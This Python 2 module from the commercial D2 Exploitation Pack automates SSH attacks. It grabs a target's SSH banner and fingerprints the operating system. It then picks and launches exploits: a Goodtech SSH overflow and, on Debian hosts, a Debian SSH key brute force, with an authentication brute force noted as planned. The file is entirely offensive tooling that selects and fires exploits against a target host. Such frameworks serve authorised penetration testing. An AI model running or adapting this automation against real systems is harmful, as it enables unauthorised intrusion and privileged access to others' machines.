#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import net.banner
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
    'SSH-2.0-cryptlib': ['Goodtech SSH overflow', 'goodtech_ssh'],
  }

  def exploit(self, target, port):
    sysos = superuser = ''
    info = self.db.db_get_info(host=target, service=None, title='OS Fingerprinting')
    if not info:
      ssh_strs = {
        'Debian':'Debian Linux',
      }
      banner = ''
      try:
        banner = net.banner.bannergrab(target, port)
      except xmlrpclib.Fault, fault:
        print fault.faultString
        return
      if banner:
        self.db.db_unique_info(self.victim, self.service, 'SSH Banner', 'autopwn_ssh', banner)
        self.log.debug('%s' % banner)
        for ssh_str in ssh_strs.keys():
          if ssh_str in banner:
            self.log.info("OS detected : %s" % ssh_strs[ssh_str])
            sysos = ssh_strs[ssh_str]
            break
      if sysos:
        self.db.db_unique_info(self.victim, None, 'OS Fingerprinting', 'autopwn_ssh', sysos)
      if "Linux" in sysos: superuser = 'root'
      if "Windows" in sysos: superuser = 'Administrator'
    # TODO : Authentication brute force
    if 'Debian' in sysos:
      self.CANVAS_EXPLOITS['Debian'] = ['Debian SSH key bruteforce', 'debian_ssh_key_brute']
    if banner:
      self.check_exploits(banner)
